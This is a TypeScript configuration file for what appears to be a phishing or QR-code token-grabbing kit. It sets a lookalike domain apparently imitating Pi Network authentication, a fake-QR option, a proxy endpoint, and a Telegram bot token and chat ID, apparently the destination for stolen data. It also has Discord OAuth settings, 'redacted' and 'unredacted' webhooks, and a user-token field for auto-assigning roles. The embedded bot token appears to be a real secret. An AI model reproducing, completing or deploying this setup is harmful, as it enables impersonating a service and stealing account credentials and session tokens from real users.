// SERVER DETAILS
export const domain = 'auth-minepi.pro';
export const fullDomain = `https://${domain}`;
export const proxies: string[] = [];
export const fakeQr = false;
export const qrCodeEndpoint = 'localhost:8080/proxy';
export const hostingOnVPS = false;

// TELEGRAM DETAILS
export const telegramToken = '8338922746:AAFjdNA6bjDdflVEmwczSvXWqmWvegGohKo';
export const telegramChatId = '-1002875610920';

// DISCORD OAUTH DETAILS
export const clientID = '';
export const clientSecret = '';
export const redirectURI = `${fullDomain}/login`;

// WEBHOOKS
export const redactedWebhook = 'REDACTED_HOOK';
export const unredactedWebhook = 'UNREDACTED_HOOK';

// AUTO ROLE
export const autoRoleToken = 'USER_TOKEN';
export const autoRoleGuildId = 'SERVER_ID';
export const autoRoleRoleId = 'ROLE_ID';
